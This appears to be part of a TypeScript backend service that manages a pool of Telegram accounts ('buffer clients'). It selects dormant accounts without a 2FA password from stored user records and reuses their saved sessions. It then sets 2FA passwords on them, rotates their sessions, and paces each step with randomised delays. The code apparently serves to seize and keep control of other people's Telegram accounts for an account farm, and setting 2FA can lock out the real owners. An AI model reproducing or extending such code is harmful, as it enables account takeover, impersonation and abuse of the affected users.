            // Just get channel info and enroll
            const channels = await channelInfo(telegramClient.client, true);
            await sleep(ClientHelperUtils.gaussianRandom(7500, 1250, 5000, 10000));

            const user = (await this.usersService.search({ mobile: document.mobile }))[0];
            const targetAvailableDate = availableDate || ClientHelperUtils.getTodayDateString();

            const bufferClient: CreateBufferClientDto = {
                tgId: document.tgId,
                session: user?.session || '', // Use old trusted session
                mobile: document.mobile,
                lastUsed: null,
                availableDate: targetAvailableDate,
                channels: channels.ids.length,
                clientId: targetClientId,
                status: 'active',
                message: 'Enrolled for warmup',
            };

            await this.bufferClientModel.findOneAndUpdate(
                { mobile: document.mobile },
                {
                    $set: {
                        ...bufferClient,
                        warmupPhase: WarmupPhase.ENROLLED,
                        warmupJitter: ClientHelperUtils.generateWarmupJitter(),
                        enrolledAt: new Date(),
                    }
                },
                { new: true, upsert: true }
            ).exec();

            this.logger.log(`Created BufferClient for ${targetClientId} with availability ${targetAvailableDate}`);
            return true;
        } catch (error: unknown) {
            const errorDetails = this.handleError(error, 'Error processing client', document.mobile);
            this.logger.error(`Error processing buffer client ${document.mobile}: ${errorDetails.message}`);
            if (isPermanentError(errorDetails)) {
                // Try to mark buffer doc inactive (may not exist yet)
                try { await this.markAsInactive(document.mobile, errorDetails.message); } catch { }
                // Also retire the source user so it's not selected again
                try { await this.usersService.update(document.tgId, { expired: true }); } catch { }
            }
            return false;
        } finally {
            await this.safeUnregisterClient(document.mobile);
            await sleep(ClientHelperUtils.gaussianRandom(12500, 1250, 10000, 15000));
        }
    }

    // ---- Buffer-specific: Pool management ----

    async addNewUserstoBufferClients(
        badIds: string[],
        goodIds: string[],
        clientsNeedingBufferClients: string[] = [],
        bufferClientsPerClient?: Map<string, number>,
    ) {
        const clientNeedingDynamic: Array<{
            clientId: string;
            totalNeeded: number;
            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;
            totalActive: number;
            totalNeededForCount: number;
            calculationReason: string;
            priority: number;
        }> = [];

        for (const clientId of clientsNeedingBufferClients) {
            const availabilityNeeds = await this.calculateAvailabilityBasedNeeds(clientId);
            if (availabilityNeeds.totalNeeded > 0) {
                clientNeedingDynamic.push({ clientId, ...availabilityNeeds });
            }
        }

        clientNeedingDynamic.sort((a, b) => a.priority - b.priority);
        await this.addNewUserstoBufferClientsDynamic(badIds, goodIds, clientNeedingDynamic, bufferClientsPerClient);
    }

    async addNewUserstoBufferClientsDynamic(
        badIds: string[],
        goodIds: string[],
        clientsNeedingBufferClients: Array<{
            clientId: string;
            totalNeeded: number;
            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;
            totalActive: number;
            totalNeededForCount: number;
            calculationReason: string;
            priority: number;
        }>,
        bufferClientsPerClient?: Map<string, number>,
    ) {
        const threeMonthsAgo = ClientHelperUtils.getDateStringDaysAgo(this.INACTIVE_USER_CUTOFF_DAYS, this.ONE_DAY_MS);

        let totalNeeded = 0;
        for (const clientNeed of clientsNeedingBufferClients) {
            totalNeeded += clientNeed.totalNeeded;
        }
        totalNeeded = Math.min(totalNeeded, this.config.maxNewClientsPerTrigger);

        if (totalNeeded === 0) return;

        const documents = await this.usersService.executeQuery(
            {
                mobile: { $nin: goodIds },
                expired: false,
                twoFA: false,
                lastActive: { $lt: threeMonthsAgo },
                totalChats: { $gt: 150 },
            },
            { tgId: 1 },
            totalNeeded + 5,
        );

        const today = ClientHelperUtils.getTodayDateString();
        const assignmentQueue: Array<{ clientId: string; priority: number }> = [];

        for (const clientNeed of clientsNeedingBufferClients) {
            for (let i = 0; i < clientNeed.totalNeeded; i++) {
                assignmentQueue.push({ clientId: clientNeed.clientId, priority: clientNeed.priority });
            }
        }

        let attemptedCount = 0;
        let createdCount = 0;
        let assignmentIndex = 0;

        while (attemptedCount < totalNeeded && documents.length > 0 && assignmentIndex < assignmentQueue.length) {
            const document = documents.shift();
            if (!document || !document.mobile || !document.tgId) continue;

            const assignment = assignmentQueue[assignmentIndex];
            if (!assignment) break;

            try {
                const created = await this.createBufferClientFromUser(document, assignment.clientId, today);
                if (created) {
                    assignmentIndex++;
                    createdCount++;
                }
                attemptedCount++;
            } catch (error: unknown) {
                this.logger.error(`Error creating connection for ${document.mobile}`);
                await sleep(ClientHelperUtils.gaussianRandom(12500, 1250, 10000, 15000));
                attemptedCount++;
            }
        }

        this.logger.log(`Dynamic batch completed: Created ${createdCount} new buffer clients (${attemptedCount} attempted)`);
    }

    // ---- Buffer-specific: Bulk session update ----

    async updateAllClientSessions() {
        const primaryClientMobiles = await this.getPrimaryClientMobiles();
        // Only update sessions for READY/SESSION_ROTATED accounts — never touch warming accounts
        const bufferClients = await this.bufferClientModel.find({
            status: 'active',
            warmupPhase: { $in: ['ready', 'session_rotated'] },
        }).exec();
        this.logger.info('Starting bulk buffer session rotation', {
            candidateCount: bufferClients.length,
            protectedPrimaryClientCount: primaryClientMobiles.size,
        });
        for (let i = 0; i < bufferClients.length; i++) {
            const bufferClient = bufferClients[i];
            if (this.isPrimaryClientMobile(bufferClient.mobile, primaryClientMobiles)) {
                this.logger.debug(`Skipping session rotation for ${bufferClient.mobile}: currently attached as primary client mobile`);
                continue;
            }
            try {
                this.logger.log(`Creating new session for mobile: ${bufferClient.mobile} (${i + 1}/${bufferClients.length})`);
                const client = await connectionManager.getClient(bufferClient.mobile, { autoDisconnect: false, handler: true });
                try {
                    const hasPassword = await client.hasPassword();
                    if (!hasPassword) {
                        // No removeOtherAuths — just set 2FA if needed
                        await client.set2fa();
                        await sleep(60000 + Math.random() * 30000);
                    }
                    await sleep(ClientHelperUtils.gaussianRandom(7500, 1250, 5000, 10000));
                    const newSession = await this.telegramService.createNewSession(bufferClient.mobile);
                    if (!newSession || newSession === bufferClient.session) {
                        throw new Error(`Failed to create distinct active session for ${bufferClient.mobile}`);
                    }
                    const hasDistinctBackup = await this.ensureDistinctUsersBackupSession(bufferClient.mobile, newSession);
                    if (!hasDistinctBackup) {
                        throw new Error(`Failed to ensure distinct backup session for ${bufferClient.mobile}`);
                    }
                    await this.update(bufferClient.mobile, {
                        session: newSession,
                        lastUsed: null,
                        message: 'Session updated successfully',
                        warmupPhase: WarmupPhase.SESSION_ROTATED,
                        sessionRotatedAt: new Date(),
                    });
                } catch (error: unknown) {
                    const errorDetails = this.handleError(error, 'Failed to create new session', bufferClient.mobile);
                    if (isPermanentError(errorDetails)) {
                        await this.update(bufferClient.mobile, {
                            status: 'inactive',
                            message: `Session update failed: ${errorDetails.message}`,
                        });
                    }
                } finally {
                    await this.safeUnregisterClient(bufferClient.mobile);
                    if (i < bufferClients.length - 1) {
                        await sleep(ClientHelperUtils.gaussianRandom(20000, 2500, 15000, 25000));
                    }
                }
            } catch (error: unknown) {
                this.logger.error(`Error creating client connection for ${bufferClient.mobile}`);
                if (i < bufferClients.length - 1) await sleep(ClientHelperUtils.gaussianRandom(20000, 2500, 15000, 25000));
            }
        }
    }

    // ---- Buffer-specific: Distribution stats ----

    async getBufferClientsByClientId(clientId: string, status?: string): Promise<BufferClientDocument[]> {
        const filter: Record<string, any> = { clientId };
        if (status) filter.status = status;
        return this.bufferClientModel.find(filter).exec();
    }

    async getBufferClientDistribution(): Promise<{
        totalBufferClients: number;
        unassignedBufferClients: number;
        activeBufferClients: number;
        inactiveBufferClients: number;
        distributionPerClient: Array<{
            clientId: string;
            assignedCount: number;
            activeCount: number;
            inactiveCount: number;
            needed: number;
            status: 'sufficient' | 'needs_more';
            neverUsed: number;
            usedInLast24Hours: number;
        }>;
        summary: {
            clientsWithSufficientBufferClients: number;
            clientsNeedingBufferClients: number;
            totalBufferClientsNeeded: number;
            maxBufferClientsPerTrigger: number;
            triggersNeededToSatisfyAll: number;
        };
    }> {
        const clients = await this.clientService.findAll();
        const now = new Date();
        const last24Hours = new Date(now.getTime() - this.ONE_DAY_MS);

        const [
            totalBufferClients, unassignedBufferClients, activeBufferClients, inactiveBufferClients,
            assignedCounts, activeCounts, inactiveCounts, neverUsedCounts, recentlyUsedCounts,
        ] = await Promise.all([
            this.bufferClientModel.countDocuments(),
            this.bufferClientModel.countDocuments({ clientId: { $exists: false } }),
            this.bufferClientModel.countDocuments({ status: 'active' }),
            this.bufferClientModel.countDocuments({ status: 'inactive' }),
            this.bufferClientModel.aggregate([{ $match: { clientId: { $exists: true, $ne: null } } }, { $group: { _id: '$clientId', count: { $sum: 1 } } }]),
            this.bufferClientModel.aggregate([{ $match: { clientId: { $exists: true, $ne: null }, status: 'active' } }, { $group: { _id: '$clientId', count: { $sum: 1 } } }]),
            this.bufferClientModel.aggregate([{ $match: { clientId: { $exists: true, $ne: null }, status: 'inactive' } }, { $group: { _id: '$clientId', count: { $sum: 1 } } }]),
            this.bufferClientModel.aggregate([{ $match: { clientId: { $exists: true, $ne: null }, status: 'active', $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }] } }, { $group: { _id: '$clientId', count: { $sum: 1 } } }]),
            this.bufferClientModel.aggregate([{ $match: { clientId: { $exists: true, $ne: null }, status: 'active', lastUsed: { $gte: last24Hours } } }, { $group: { _id: '$clientId', count: { $sum: 1 } } }]),
        ]);

        const toMap = (arr: any[]) => new Map(arr.map((item: { _id: string; count: number }) => [item._id, item.count]));
        const assignedCountMap = toMap(assignedCounts);
        const activeCountMap = toMap(activeCounts);
        const inactiveCountMap = toMap(inactiveCounts);
        const neverUsedCountMap = toMap(neverUsedCounts);
        const recentlyUsedCountMap = toMap(recentlyUsedCounts);

        const distributionPerClient = [];
        let clientsWithSufficient = 0, clientsNeedingMore = 0, totalNeeded = 0;

        for (const client of clients) {
            const activeCount = activeCountMap.get(client.clientId) || 0;
            const needed = Math.max(0, this.config.minTotalClients - activeCount);
            distributionPerClient.push({
                clientId: client.clientId,
                assignedCount: assignedCountMap.get(client.clientId) || 0,
                activeCount,
                inactiveCount: inactiveCountMap.get(client.clientId) || 0,
                needed,
                status: (needed === 0 ? 'sufficient' : 'needs_more') as 'sufficient' | 'needs_more',
                neverUsed: neverUsedCountMap.get(client.clientId) || 0,
                usedInLast24Hours: recentlyUsedCountMap.get(client.clientId) || 0,
            });
            if (needed === 0) clientsWithSufficient++; else { clientsNeedingMore++; totalNeeded += needed; }
        }

        return {
            totalBufferClients, unassignedBufferClients, activeBufferClients, inactiveBufferClients,
            distributionPerClient,
            summary: {
                clientsWithSufficientBufferClients: clientsWithSufficient,
                clientsNeedingBufferClients: clientsNeedingMore,
                totalBufferClientsNeeded: totalNeeded,
                maxBufferClientsPerTrigger: this.config.maxNewClientsPerTrigger,
                triggersNeededToSatisfyAll: Math.ceil(totalNeeded / this.config.maxNewClientsPerTrigger),
            },
        };
    }

    async getBufferClientsByStatus(status: ClientStatusType): Promise<BufferClient[]> {
        return this.bufferClientModel.find({ status }).exec();
    }

    async getBufferClientsWithMessages() {
        return this.bufferClientModel.find({}, { mobile: 1, status: 1, message: 1, clientId: 1, lastUsed: 1 }).exec();
    }

    async getLeastRecentlyUsedBufferClients(clientId: string, limit: number = 1): Promise<BufferClient[]> {
        return await this.getLeastRecentlyUsedClients(clientId, limit) as BufferClient[];
    }

    async getNextAvailableBufferClient(clientId: string): Promise<BufferClientDocument | null> {
        const clients = await this.getLeastRecentlyUsedBufferClients(clientId, 1);
        return clients.length > 0 ? clients[0] as BufferClientDocument : null;
    }

    async getUnusedBufferClients(hoursAgo: number = 24, clientId?: string): Promise<BufferClientDocument[]> {
        return await this.getUnusedClients(hoursAgo, clientId) as BufferClientDocument[];
    }
}
